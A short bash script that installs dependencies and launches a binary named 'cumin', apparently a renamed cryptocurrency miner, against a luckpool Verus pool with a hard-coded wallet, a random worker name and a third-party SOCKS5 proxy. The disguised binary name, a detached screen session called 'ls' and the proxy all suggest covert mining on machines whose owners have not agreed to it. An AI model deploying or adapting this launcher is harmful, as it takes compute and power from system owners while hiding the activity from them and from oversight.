#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RTMnP39ZBF9UJB2xKDT7FAp8iZ2eW7wemU
WORKER=$(echo $(shuf -i 1-7 -n 1)-REVOKE)
PROXY=socks5://98.185.83.121:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
